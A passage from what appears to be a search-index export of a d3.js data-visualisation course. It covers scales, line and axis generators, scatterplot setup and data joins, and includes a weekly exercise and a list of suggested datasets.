pixels our point will be from the x axis. We want to use our <code>boundedHeight</code> to stay within our margins. Remember, SVG y-values count from top to bottom so we want our range to start at the top.</p> <p>{lang=javascript,crop-query=.yScale} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p>We just made our first scale function! Let's test it by logging some values to the console. At what y value is the freezing point on our chart?</p> <pre><code>console.log(yScale(32))\n</code></pre> <p>The outputted number should tell us how far away the freezing point will be from the bottom of the y axis.</p> <p>A&gt;If this returns a negative number, congratulations! You live in a lovely, warm place. Try replacing it with a number that \"feels like freezing\" to you. Or highlight another temperature that's meaningful to you.</p> <p>Let's visualize this threshold by adding a rectangle covering all temperatures below freezing. The SVG <code>&lt;rect&gt;</code> element can do exactly that. We just need to give it four attributes: <code>x</code>, <code>y</code>, <code>width</code>, and <code>height</code>.</p> <p>T&gt;For more information about SVG elements, the MDN docs are a wonderful resource: here is the page for <code>&lt;rect&gt;</code>.</p> <p>{lang=javascript,crop-query=context(.freezingTemperaturePlacement-.freezingTemperatures, 0, -1)} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p>Now we can see a black rectangle spanning the width of our bounds.</p> <p></p> <p>Let's make it a frosty blue to connote \"freezing\" and decrease its visual importance. You can't style SVG elements with <code>background</code> or <code>border</code> \u2014 instead, we can use <code>fill</code> and <code>stroke</code> respectively. We'll discuss the differences later in more depth. As we can see, the default fill for SVG elements is black and the default stroke color is <code>none</code> with a width of 1px.</p> <p>{lang=javascript,crop-query=context(.freezingTemperaturePlacement-.freezingTemperatures, -1, 0)} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p>Let's look at the rectangle in the Elements panel to see how the <code>.attr()</code> methods manipulated it.</p> <pre><code>&lt;rect\n  x=\"0\"\n  width=\"1530\"\n  y=\"325.7509689922481\"\n  height=\"24.24903100775191\"\n  fill=\"rgb(224, 243, 243)\"\n&gt;&lt;/rect&gt;\n</code></pre> <p>Looking good!</p> <p>A&gt;Some SVG styles can be set with either a CSS style or an attribute value, such as fill, stroke, and stroke-width. It's up to you whether you want to set them with <code>.style()</code> or <code>.attr()</code>. Once we're familiar with styling our charts, we'll apply classes using <code>.attr(\"class\", \"class-name\")</code> and add styles to a separate CSS file. A&gt; A&gt;In this code, we're using <code>.attr()</code> to set the fill because an attribute has a lower CSS precedence than linked stylesheets, which will let us overwrite the value. If we used <code>.style()</code>, we'd be setting an inline style which would require an <code>!important</code> CSS declaration to override.</p> <p>Let's move on and create a scale for the x axis. This will look like our y axis but, since we're working with date objects, we'll use a time scale which knows how to handle date objects.</p> <p>{lang=javascript,crop-query=.xScale} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p>Now that we have our scales defined, we can start drawing our chart!</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.07/creating-our-scales/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_00/lesson_00.08/drawing-the-line/","title":"Drawing the line","text":"<p>The timeline itself will be a single path SVG element. path elements take a d attribute (short for data) that tells them what shape to make. If you've ever played a learn-to-program game for kids, creating a d string is similar.</p> <p>{width=50%} </p> <p>The d attribute will take a few commands that can be capitalized (if giving an absolute value) or lowercased (if giving a relative value):</p> <ul> <li>M will move to a point (followed by x and y values)</li> <li>L will draw a line to a point (followed by x and y values)</li> <li>Z will draw a line back to the first point</li> <li>...</li> </ul> <p>For example, let's draw this path:</p> <pre><code>bounds.append(\"path\").attr(\"d\", \"M 0 0 L 100 0 L 100 100 L 0 50 Z\")\n</code></pre> <p>We can see a new shape at the top of our chart.</p> <p>{width=30%} </p> <p>More d commands exist, but thankfully we don't need to learn them. d3's module d3-shape has a <code>d3.line()</code> method that will create a generator that converts data points into a d string.</p> <p>{lang=javascript,crop-query=context(.lineGenerator, 0, -2)} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p>{pagebreak}</p> <p>Our generator needs two pieces of information:</p> <ol> <li>how to find an x axis value, and</li> <li>how to find a y axis value.</li> </ol> <p>We set these values with the <code>x</code> and <code>y</code> method, respectively, which each take one parameter: a function to convert a data point into an x or y value.</p> <p>We want to use our accessor functions, but remember: our accessor functions return the unscaled value.</p> <p>We'll transform our data point with both the accessor function and the scale to get the scaled value in pixel space.</p> <p>{lang=javascript,crop-query=.lineGenerator} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p>Now we're ready to add the <code>path</code> element to our bounds.</p> <pre><code>const line = bounds.append(\"path\")\n</code></pre> <p>Let's feed our dataset to our line generator to create the d attribute and tell the line what shape to be.</p> <pre><code>const line = bounds.append(\"path\")\n    .attr(\"d\", lineGenerator(dataset))\n</code></pre> <p>Success! We have a chart with a line showing our max temperature for the whole year.</p> <p>Something looks wrong, though:</p> <p></p> <p>Remember that SVG elements default to a black fill and no stroke, which is why we see this dark filled-in shape. This isn't what we want! Let's add some styles to get an orange line with no fill.</p> <p>{lang=javascript,crop-query=choose(.line, 1)} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p></p> <p>We're almost there, but something is missing. Let's finish up by drawing our axes.</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.08/drawing-the-line/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_00/lesson_00.09/drawing-the-axes/","title":"Drawing the axes","text":"<p>Let's start with the y axis. d3's d3-axis module has axis generator methods which will draw an axis for the given scale.</p> <p>Unlike the methods we've used before, d3 axis generators will append multiple elements to the page.</p> <p>{pagebreak}</p> <p>There is one method for each orientation, which will specify the placement of labels and tick marks:</p> <ul> <li><code>axisTop</code></li> <li><code>axisRight</code></li> <li><code>axisBottom</code></li> <li><code>axisLeft</code></li> </ul> <p>Following common convention, we want the labels of our y axis to be to the left of the axis line, so we'll use <code>d3.axisLeft()</code> and pass it our y scale.</p> <p>{lang=javascript,crop-query=.yAxisGenerator} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p>When we call our axis generator, it will create a lot of elements \u2014 let's create a <code>g</code>\u00a0element to hold all of those elements and keep our DOM organized. Then we'll pass that new element to our\u00a0<code>yAxisGenerator</code>\u00a0function to tell it where to draw our axis.</p> <pre><code>const yAxis = bounds.append(\"g\")\n\nyAxisGenerator(yAxis)\n</code></pre> <p>This method works but it will break up our chained methods. To fix this, d3 selections have a <code>.call()</code> method that will execute the provided function with the selection as the first parameter.</p> <p>We can use <code>.call()</code> to:</p> <ol> <li>prevent saving our selection as a variable, and</li> <li>preserve the selection for additional chaining.</li> </ol> <p>Note that this code does exactly the same thing as the snippet above - we are passing the function <code>yAxisGenerator</code> to <code>.call()</code>, which then runs the function for us.</p> <p>{lang=javascript,crop-query=.yAxis} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p>And voila, we have our first axis!</p> <p></p> <p>The small notches perpendicular to the axis are called tick marks. d3 has made behind-the-scenes decisions about how many tick marks to make and how far apart to draw them. We'll learn more about how to customize this later.</p> <p></p> <p>Let's create the x axis in the same way, this time using <code>d3.axisBottom()</code>.</p> <p>{lang=javascript,crop-query=.xAxisGenerator} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p>Alright! Now let's create another <code>&lt;g&gt;</code> element and draw our axis.</p> <pre><code>const xAxis = bounds.append(\"g\")\n    .call(xAxisGenerator)\n</code></pre> <p>A&gt;We could <code>.call()</code> our x axis directly on our bounds: A&gt; A&gt;<code>const xAxis = bounds.call(xAxisGenerator)</code> A&gt; A&gt;This would create our axis directly under our bounds (in the DOM). A&gt; A&gt;However, it's a good idea to create a <code>&lt;g&gt;</code> element to contain our axis elements for three main reasons: A&gt; A&gt;1. to keep our DOM organized, for debugging or exporting A&gt;2. if we want to remove or update our axis, we'll want an easy way to target all of the elements A&gt;3. modifying our whole axis at once, for example when we want to move it around.</p> <p>The axis looks right, but it's in the wrong place:</p> <p></p> <p>Why didn't <code>.axisBottom()</code> draw the axis in the right place? d3's axis generator functions know where to place the tick marks and tick labels relative to the axis line, but they have no idea where to place the axis itself.</p> <p>To move the x axis to the bottom, we can shift the x axis group, similar to how we shifted our chart bounds using a CSS transform.</p> <p>{lang=javascript,crop-query=.xAxis} &lt;&lt;code/01-making-your-first-chart/completed/chart.js</p> <p>And just like that we're done making our first chart!</p> <p></p> <p>Next, let's dive into making a slightly more complex chart and talk more about how d3 works for a deeper understanding of the concepts we just learned.</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.09/drawing-the-axes/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_00/lesson_00.10/exercise-week-1/","title":"This week's exercise","text":"<p>Whew, awesome work getting through our first week! Before you start the next module, let's do an exercise to consolidate what we've learned so far. We'll do an exercise every week to build on our new skills and get practice working with unfamiliar datasets.</p> <p>During this week, make a totally new timeline! I've put together a list of fun datasets.</p> <p>Choose a dataset to play with -- you'll want to pick one with a metric that changes over time. Here are a few suggestions:</p> <ul> <li>look at how many colors Bob Ross used in his paintings over time</li> <li>look at how many opera performances there were for different composers, each year</li> <li>look at the height of newly constructed lighthouses over time</li> </ul> <p>Fork our timeline CodeSandbox, download the data, and import it into your new forked sandbox.</p> <p>A&gt; If the data is a csv file, you'll need to use <code>d3.csv()</code> instead of <code>d3.json()</code>.</p> <p>Now, go over the same steps we went through this week to make a timeline with this new data.</p> <p>If you get stuck, watch this week's videos again or post a question inline or on the Discord channel. Good luck! We're rooting for you!</p> <p>And once you're finished, show off your wonderful custom visualization on Twitter or on the Discord! We'd love to see it!</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.11/datasets/","title":"Datasets","text":""},{"location":"datav/codes/code/course-full/module_00/lesson_00.11/datasets/#datasets","title":"Datasets","text":""},{"location":"datav/codes/code/course-full/module_00/lesson_00.11/datasets/#bob-ross-paintings","title":"Bob Ross paintings","text":"<p>Info about ~400 paintings by Bob Ross</p> <p>info</p> <p>Metrics: painting number, image url, title, season, episode, # unique colors, YouTube link, colors used</p> <p>raw data</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.11/datasets/#opera-performances","title":"Opera performances","text":"<p>Info about six seasons of global opera performances (2012 - 2018).</p> <p>info</p> <p>Metrics: season start &amp; end, composer name, date of birth &amp; death, nationality, gender, work, type of work</p> <p>raw data</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.11/datasets/#witch-trials","title":"Witch Trials","text":"<p>Data on more than 10 thousand witch trials &amp; related battles in Europe.</p> <p>info</p> <p>Metrics about battles: name, date, location, war name, source</p> <p>raw data about battles</p> <p>Metrics about trials: year, tried, deaths, place, source</p> <p>raw data about trials</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.11/datasets/#first-kisses","title":"First kisses","text":"<p>Here's a fun one! This is a list of artist Galen Beebe's 48 first kisses.</p> <p>info (a fun visual essay!)</p> <p>Metrics: age comparison, where, when, gender, orientation, if it was their last kiss, their sun sign, and lots of subjective info like how much Galen enjoyed it</p> <p>raw data</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.11/datasets/#uk-lighthouses","title":"UK Lighthouses","text":"<p>Info about more than 600 lighthouses &amp; related buildings in England &amp; Wales between 1514 - 1911. You'll need to convert the xlsx file to csv, there are lots of tools out there like this one.</p> <p>info</p> <p>Metrics: name, location, number of lights in different time periods, visibility, height, construction year</p> <p>raw data (under available files),</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.11/datasets/#penguins","title":"Penguins","text":"<p>An adorable dataset about physical characteristics of penguins in three separate species.</p> <p>info</p> <p>Metrics: species, island, bill length &amp; depth, flipper length, weight, sex</p> <p>raw data,</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.11/datasets/#mma-fighter-stats","title":"MMA Fighter stats","text":"<p>Some good numeric data in here, looking at MMA fighters &amp; boxers.</p> <p>info</p> <p>Metrics: name, nickname, height, weight, reach, stance, wins, losses, draws, total fights, win percent</p> <p>raw data,</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.11/datasets/#love-island-contestants","title":"Love Island contestants","text":"<p>I figure there's tons of fun data in here! Apparently there's a British dating reality show called Love Island. Here's a dataset of info about each contestant (almost 100!).</p> <p>info</p> <p>Metrics: name, series year outcome, age, profession, where they live, gender, and lots of show-specific info</p> <p>raw data,</p>"},{"location":"datav/codes/code/course-full/module_00/lesson_00.11/datasets/#more-datasets","title":"More datasets","text":"<p>Nothing hit the spot in here? Here are a few great resources for finding fun datasets:</p> <ul> <li>Data is Plural</li> <li>Data World</li> <li>The Pudding datasets</li> </ul>"},{"location":"datav/codes/code/course-full/module_01/lesson_01.00/making-a-scatterplot/","title":"Intro","text":"<p>Now that we've created our first chart, let's create another chart that's a little more complex. At the end of this chapter, we'll have a deeper understanding of each step required to make a chart in d3.</p> <p>There are endless questions we could ask our weather dataset \u2014 many of them ask about the relationship between different metrics. Let's investigate these two metrics:</p> <ul> <li>dew point is the highest temperature (\u00b0F) at which dew droplets form</li> <li>humidity is the amount of water vapor in the air</li> </ul> <p>I would expect them to be correlated \u2014 high humidity should cause a higher dew point temperature, right? Let's dive in and find out!</p>"},{"location":"datav/codes/code/course-full/module_01/lesson_01.00/making-a-scatterplot/#deciding-the-chart-type","title":"Deciding the chart type","text":"<p>When looking at the relationship between two metrics, a scatterplot is a good choice.</p> <p>A scatterplot includes two axes:</p> <ul> <li>an x axis that displays one metric and</li> <li>a y axis that displays the other.</li> </ul> <p>We'll plot each data point (in this case, a single day) as a dot. If we wanted to involve a third metric, we could even add another dimension by changing the color or the size of each dot.</p> <p>{width=50%} </p> <p>The great thing about scatter plots is that when we're finished plotting the chart, we'll get a clear view of the relationship between the two metrics.</p>"},{"location":"datav/codes/code/course-full/module_01/lesson_01.01/steps-in-drawing-any-chart/","title":"Steps in drawing any chart","text":"<p>In d3, there are general steps that we need to take every time we make a chart \u2014 we briefly went through each of them in Chapter 1 to create our line chart, but now let's create a checklist to give us a roadmap for future charts.</p> <ol> <li>Access data</li> </ol> <p>Look at the data structure and declare how to access the values we'll need</p> <ol> <li>Create chart dimensions</li> </ol> <p>Declare the physical (i.e. pixels) chart parameters</p> <ol> <li>Draw canvas</li> </ol> <p>Render the chart area and bounds element</p> <ol> <li>Create scales</li> </ol> <p>Create scales for every data-to-physical attribute in our chart</p> <ol> <li>Draw data</li> </ol> <p>Render your data elements</p> <ol> <li>Draw peripherals</li> </ol> <p>Render your axes, labels, and legends</p> <ol> <li>Set up interactions</li> </ol> <p>Initialize event listeners and create interaction behavior - we'll get to this step in Lesson 5</p> <p></p> <p>Let's dig in!</p>"},{"location":"datav/codes/code/course-full/module_01/lesson_01.02/access-data-for-scatterplot/","title":"Access data","text":"<p>As we saw in Chapter 1, this step will be quick! We can utilize <code>d3.json()</code> to grab the <code>my_weather_data.json</code> file.</p> <p>{lang=javascript,crop-query=.dataset} &lt;&lt;code/02-making-a-scatterplot/completed/chart.js</p> <p>The next part of the Access data step is to create our accessor functions. Let's log the first data point to the console to look at the available keys.</p> <pre><code>const dataset = await d3.json(\"./data/my_weather_data.json\")\nconsole.table(dataset[0])\n</code></pre> <p>We can see the metrics we're interested in as <code>humidity</code> and <code>dewPoint</code>. Let's use those to define our accessor functions.</p> <p>{lang=javascript,crop-query=.xAccessor-.yAccessor} &lt;&lt;code/02-making-a-scatterplot/completed/chart.js</p> <p>Perfect! Now that we can access our data, we can move to the next step.</p>"},{"location":"datav/codes/code/course-full/module_01/lesson_01.02/access-data-for-scatterplot/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_01/lesson_01.03/create-chart-dimensions/","title":"Create chart dimensions","text":"<p>Next up, we need to define the dimensions of our chart. Typically, scatterplots are square, with the x axis as wide as the y axis is tall. This makes it easier to look at the overall shape of the data points once they're plotted by not stretching or squashing one of the scales.</p> <p>To make a square chart, we want the height to be the same as the width. We could use the same width we used in Module 1 (<code>window.innerWidth * 0.9</code>), but then the chart might extend down the page, out of view on horizontal screens.</p> <p>Ideally, the chart will be as large as possible while still fitting on our screen.</p> <p>To fix this problem, we want to use either the height or the width of the <code>window</code>, whichever one is smaller. And because we want to leave a little bit of whitespace around the chart, we'll multiply the value by <code>0.9</code> (so 90% of the total width or height).</p> <p>d3-array can help us out here with the <code>d3.min</code> method. <code>d3.min</code> takes two arguments:</p> <ol> <li>an array of data points</li> <li>an accessor function to grab the value from each data point</li> </ol> <p>Though in this case we won't need to specify the second parameter because it defaults to an identity function and returns the value.</p> <p>{lang=javascript,crop-query=.width} &lt;&lt;code/02-making-a-scatterplot/completed/chart.js</p> <p>{pagebreak}</p> <p>A&gt;There is a native browser method (<code>Math.min</code>) that will also find the lowest number \u2014 why wouldn't we use that? <code>Math.min</code> is great, but there are a few benefits to <code>d3.min</code>: A&gt; A&gt;- <code>Math.min</code> will count any <code>null</code>s in the array as <code>0</code>, whereas <code>d3.min</code> will ignore them A&gt;- <code>Math.min</code> will return <code>NaN</code> if there is a value in the array that is <code>undefined</code> or can't be converted into a number, whereas <code>d3.min</code> will ignore it A&gt;- <code>d3.min</code> will prevent the need to create another array of values if we need to use an accessor function A&gt;- <code>Math.min</code> will return <code>Infinity</code> if the dataset is empty, whereas <code>d3.min</code> will return <code>undefined</code> A&gt;- <code>Math.min</code> uses numeric order, whereas <code>d3.min</code> uses natural order, which allows it to handle strings. Make sure to convert your values to numbers beforehand A&gt; A&gt;You can see how <code>d3.min</code> would be preferable when creating charts, especially when using dynamic data.</p> <p>Now let's use our <code>width</code> variable to define the chart dimensions:</p> <pre><code>let dimensions = {\n  width: width,\n  height: width,\n}\n</code></pre> <p>We were introduced to the concept of wrapper and bounds in Chapter 1. As a reminder:</p> <ul> <li>the wrapper is your entire SVG element, containing your axes, data elements, and legends</li> <li>the bounds live inside of the wrapper, containing just the data elements</li> </ul> <p>Having margins around the bounds allows us to allocate space for our static chart elements (axes and legends) while allowing the charting area to be dynamically sized based on the available space.</p> <p>{width=50%} </p> <p>We want a small <code>top</code> and <code>right</code> margin to give the chart some space. Dots near the top or right of the chart or the y axis's topmost tick label might overflow our bounds (because the position of the dot is technically the center of the dot, but the dot has a radius).</p> <p>We'll want a larger <code>bottom</code> and <code>left</code> margin to create room for our axes.</p> <p>{lang=javascript,crop-query=.dimensions} &lt;&lt;code/02-making-a-scatterplot/completed/chart.js</p> <p>Lastly, we want to define the width and height of our bounds, calculated from the space remaining after we add the margins.</p> <p>{lang=javascript,crop-query=context(.dimensions.boundedWidth, 0, 6)} &lt;&lt;code/02-making-a-scatterplot/completed/chart.js</p> <p>A&gt;You might be asking: why do we have to be explicit about the chart dimensions? Generally when developing for the web we can let elements size themselves to fit their contents or to fill the available space. That's not an option here for a few reasons: A&gt; A&gt;- SVG elements scale in an unfamiliar and inconsistent way A&gt;- we need to know the width and height of the chart in order to calculate the scale outputs A&gt;- we generally want more control over the size of our chart elements \u2014 in this example, we want the width and height to be the same size, we want our dots to be large enough to see, etc</p>"},{"location":"datav/codes/code/course-full/module_01/lesson_01.03/create-chart-dimensions/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_01/lesson_01.04/draw-canvas/","title":"Draw canvas","text":"<p>Let's make some SVG elements! This step will look exactly like our line chart code. First, we find an existing DOM element (<code>#wrapper</code>), and append an <code>&lt;svg&gt;</code> element.</p> <p>Then we use <code>attr</code> to set the size of the <code>&lt;svg&gt;</code> to our <code>dimensions.width</code> and <code>dimensions.height</code>. Note that these sizes are the size of the \"outside\" of our plot. Everything we draw next will be within this <code>&lt;svg&gt;</code>.</p> <p>{lang=javascript,crop-query=.wrapper} &lt;&lt;code/02-making-a-scatterplot/completed/chart.js</p> <p>Next, we create our bounds and shift them to accommodate our top &amp; left margins.</p> <p>{lang=javascript,crop-query=.bounds} &lt;&lt;code/02-making-a-scatterplot/completed/chart.js</p> <p>Above, we create a <code>&lt;g&gt;</code> (think \"group\") element and we use the <code>transform</code> CSS property to move it to the right and down (note that the <code>left</code> margin pushes our bounds to the right, and a top margin pushes our bounds down).</p> <p>This <code>bounds</code> is the \"inner\" part of our chart that we will use for our data elements.</p>"},{"location":"datav/codes/code/course-full/module_01/lesson_01.04/draw-canvas/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_01/lesson_01.05/create-scales/","title":"Create scales","text":"<p>Before we draw our data, we have to figure out how to convert numbers from the data domain to the pixel domain.</p> <p>Let's start with the x axis. We want to decide the horizontal position of each day's dot based on its dew point.</p> <p>To find this position we use a d3 scale object, which helps us map our data to pixels. Let's create a scale that will take a dew point (temperature) and tell us how far to the right a dot needs to be.</p> <p>This will be a linear scale because the input (dew point) and the output (pixels) will be numbers that increase linearly.</p> <pre><code>const xScale = d3.scaleLinear()\n</code></pre>"},{"location":"datav/codes/code/course-full/module_01/lesson_01.05/create-scales/#the-concept-behind-scales","title":"The concept behind scales","text":"<p>Remember, we need to tell our scale:</p> <ul> <li>what inputs it will need to handle (domain), and</li> <li>what outputs we want back (range).</li> </ul> <p>For a simple example, let's pretend that the temperatures in our dataset range from 0 to 100 degrees.</p> <p>In this case, converting from temperature to pixels is easy: a temperature of 50 degrees maps to 50 pixels because both range and domain are <code>[0,100]</code>.</p> <p>But the relationship between our data and the pixel output is rarely so simple. What if our chart was 200 pixels wide? What if we have to handle negative temperatures?</p> <p>Mapping between metric values and pixels is one of the areas in which d3 scales shine.</p>"},{"location":"datav/codes/code/course-full/module_01/lesson_01.05/create-scales/#finding-the-extents","title":"Finding the extents","text":"<p>In order to create a scale, we need to pick the smallest and largest values we will handle. These numbers can be anything you want, but the standard practice is to examine your data and extract the minimum and maximum values. This way your chart will \"automatically\" scale according to the values in your dataset.</p> <p>D3 has a helper function we can use here: <code>d3.extent()</code> that takes two parameters:</p> <ol> <li>an array</li> <li>an accessor function that extracts the metric value from a data point. If not specified, this defaults to an identity function <code>d =&gt; d</code>.</li> </ol> <p>We'll pass <code>d3.extent()</code> our dataset and our <code>xAccessor()</code> function and get the min and max temperatures we need to handle (in <code>[min, max]</code> format).</p> <p>{lang=javascript,crop-query=context(.xScale, 0, -1)} &lt;&lt;code/02-making-a-scatterplot/completed/chart.js</p> <p>This scale will create a perfectly useable chart, but we can make it slightly friendlier. With this x scale, our x axis will have a domain of <code>[11.8, 77.26]</code> \u2014 the exact min and max values from the dataset. The resulting chart will have dots that extend all the way to the left and right edges.</p> <p>{width=50%} </p> <p>While this works, it would be easier to read the axes if the first and last tick marks were round values. Note that d3 won't even label the top and bottom tick marks of an axis with a strange domain \u2014 it might be hard to reason about a chart that scales up to 77.26 degrees. That number of decimal points gives too much unnecessary information to the reader, making them do the next step of rounding the number to a more tangible one.</p> <p>{width=50%} </p> <p>d3 scales have a <code>.nice()</code> method that will round our scale's domain, giving our x axis friendlier bounds.</p> <p>We can look at how <code>.nice()</code> modifies our x scale's domain by looking at the values before and after using <code>.nice()</code>. Note that  calling <code>.domain()</code> without parameters on an existing scale will output the scale's existing domain instead of updating it.</p> <pre><code>console.log(xScale.domain())\nxScale.nice()\nconsole.log(xScale.domain())\n</code></pre> <p>With the New York City dataset, the domain changes from <code>[11.8, 77.26]</code> to <code>[10, 80]</code> \u2014 much friendlier! Let's chain that method when we create our scale.</p> <p>{lang=javascript,crop-query=.xScale} &lt;&lt;code/02-making-a-scatterplot/completed/chart.js</p> <p>Creating our y scale will be very similar to creating our x scale. The only differences are:</p> <ol> <li>we'll be using our <code>yAccessor()</code> to grab the humidity values, and</li> <li>we want to invert the range to make sure the axis runs bottom-to-top.</li> </ol> <p>{lang=javascript,crop-query=.yScale} &lt;&lt;code/02-making-a-scatterplot/completed/chart.js</p> <p>If we were curious about how <code>.nice()</code> modifies our y scale, we could log those values.</p> <pre><code>console.log(d3.extent(dataset, yAccessor))\nconsole.log(yScale.domain())\n</code></pre> <p>In this case, the domain changed from <code>[0.27, 0.97]</code> to <code>[0.2, 1]</code>, which will create a  much friendlier chart.</p>"},{"location":"datav/codes/code/course-full/module_01/lesson_01.05/create-scales/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_01/lesson_01.06/draw-data/","title":"Draw data","text":"<p>Here comes the fun part! Drawing our scatter plot dots will be different from how we drew our timeline. Remember that we had one line that covered all of the data points? For our scatter plot, we want one element per data point.</p> <p>We'll want to use the <code>&lt;circle&gt;</code> SVG element, which thankfully doesn't need a d attribute string. Instead, we'll give it cx and cy attributes, which set its x and y coordinates, respectively. These position the center of the circle, and the r attribute sets the circle's radius (half of its width or height).</p> <p>Let's draw a circle in the center of our chart to test it out.</p> <pre><code>bounds.append(\"circle\")\n  .attr(\"cx\", dimensions.boundedWidth / 2)\n  .attr(\"cy\", dimensions.boundedHeight / 2)\n  .attr(\"r\", 5)\n</code></pre> <p></p> <p>A&gt;Starting to get SVG elements mixed up? No worries! We have an SVG elements cheat sheet PDF to help remember what elements exist and what attributes they want. Don't worry if you don't recognize any of the elements \u2014 we'll cover them all by the end of the course.</p> <p></p> <p>Great! Now let's add one of those for each day.</p> <p>A straightforward way of drawing the dots would be to map over each element in the dataset and append a circle to our bounds.</p> <pre><code>data.forEach(d =&gt; {\n  bounds\n    .append(\"circle\")\n    .attr(\"cx\", xScale(xAccessor(d)))\n    .attr(\"cy\", yScale(yAccessor(d)))\n    .attr(\"r\", 5)\n})\n</code></pre> <p>Look at that! Now we're starting to get a better sense of our data.</p> <p>{width=50%} </p> <p>While this method of drawing the dots works for now, there are a few issues we should address.</p> <ul> <li>We're adding a level of nesting, which makes our code harder to follow.</li> <li>If we run this function twice, we'll end up drawing two sets of dots. When we start updating our charts, we will want to draw and update our data with the same code to prevent repeating ourselves.</li> </ul> <p>To address these issues and keep our code clean, let's handle the dots without using a loop.</p>"},{"location":"datav/codes/code/course-full/module_01/lesson_01.06/draw-data/#data-joins","title":"Data joins","text":"<p>Scratch that last block of code. D3 has functions that will help us address the above problems.</p> <p>We'll start off by grabbing all <code>&lt;circle&gt;</code> elements in a d3 selection object. Instead of using d3.selection's <code>.select()</code> method, which returns one matching element, we'll use its <code>.selectAll()</code> method, which returns an array of matching elements.</p> <pre><code>const dots = bounds.selectAll(\"circle\")\n</code></pre> <p>This will seem strange at first \u2014 we don't have any dots yet, why would we select something that doesn't exist? Don't worry! You'll soon become comfortable with this pattern.</p> <p>We're creating a d3 selection that is aware of what elements already exist. If we had already drawn part of our dataset, this selection will be aware of what dots were already drawn, and which need to be added.</p> <p>To tell the selection what our data look like, we'll pass our dataset to the selection's <code>.data()</code> method.</p> <pre><code>const dots = bounds.selectAll(\"circle\")\n    .data(data)\n</code></pre> <p>When we call <code>.data()</code> on our selection, we're joining our selected elements with our array of data points. The returned selection will have a list of existing elements, new elements that need to be added, and old elements that need to be removed.</p> <p>We'll see these changes to our selection object in three ways:</p> <ul> <li>our selection object is updated to contain any overlap between existing DOM elements and data points</li> <li>an _enter key is added that lists any data points that don't already have an element rendered</li> <li>an _exit key is added that lists any data points that are already rendered but aren't in the provided dataset</li> </ul> <p>{width=70%} </p> <p>Let's get an idea of what that updated selection object looks like by logging it to the console.</p> <pre><code>let dots = bounds.selectAll(\"circle\")\nconsole.log(dots)\ndots = dots.data(data)\nconsole.log(dots)\n</code></pre> <p>Remember, the currently selected DOM elements are located under the <code>_groups</code> key. Before we join our dataset to our selection, the selection just contains an empty array. That makes sense! There are no circles in bounds yet.</p> <p></p> <p>However, the next selection object looks different. We have two new keys: <code>_enter</code> and <code>_exit</code>, and our <code>_groups</code> array has an array with 365 elements \u2014 the number of data points in our dataset.</p> <p></p> <p>Let's take a closer look at the <code>_enter</code> key. If we expand the array and look at one of the values, we can see an object with a <code>__data__</code> property.</p> <p></p> <p>A&gt;For the curious, the <code>namespaceURI</code> key tells the browser that the element is a SVG element and needs to be created in the \"http://www.w3.org/2000/svg\" namespace (SVG), instead of the default \"http://www.w3.org/1999/xhtml\" namespace (XHTML).</p> <p>If we expand the <code>__data__</code> value, we will see one our data points.</p> <p>Great! We can see that each value in <code>_enter</code> corresponds to a value in our dataset. This is what we would expect, since all of the data points need to be added to the DOM.</p> <p>The <code>_exit</code> value is an empty array \u2014 if we were removing existing elements, we would see those listed out here.</p> <p>In order to act on the new elements, we can create a d3 selection object containing just those elements with the <code>enter</code> method. There is a matching method (<code>exit</code>) for old elements that we'll need when we go over transitions in Chapter 4.</p> <p></p> <p>Let's get a better look at that new selection object:</p> <pre><code>const dots = bounds.selectAll(\"circle\")\n    .data(data)\n  .enter()\nconsole.log(dots)\n</code></pre> <p>This looks just like any d3 selection object we've manipulated before. Let's append one <code>&lt;circle&gt;</code> for each data point. We can use the same <code>.append()</code> method we've been using for single-node selection objects and d3 will create one element for each data point.</p> <pre><code>const dots = bounds.selectAll(\"circle\")\n    .data(dataset)\n  .enter().append(\"circle\")\n</code></pre> <p>When we load our webpage, we will still have a blank page. However, we will be able to see lots of new empty <code>&lt;circle&gt;</code> elements in our bounds in the Elements panel.</p> <p>Let's set the position and size of these circles.</p> <pre><code>const dots = bounds.selectAll(\"circle\")\n    .data(data)\n  .enter().append(\"circle\")\n    .attr(\"cx\", d =&gt; xScale(xAccessor(d)))\n    .attr(\"cy\", d =&gt; yScale(yAccessor(d)))\n    .attr(\"r\", 5)\n</code></pre> <p>We can write the same code we would write for a single-node selection object. Any attribute values that are functions will be passed each data point individually. This helps keep our code concise and consistent.</p> <p>Let's make these dots a lighter color to help them stand out.</p> <pre><code>.attr(\"fill\", \"cornflowerblue\")\n</code></pre>"},{"location":"datav/codes/code/course-full/module_01/lesson_01.06/draw-data/#data-join-exercise","title":"Data join exercise","text":"<p>Here's a quick example to help visualize the data join concept. We're going to split the dataset in two and draw both parts separately. Temporarily comment out your finished dots code so we have a clear slate to work with. We'll put it back when we're done with this exercise.</p> 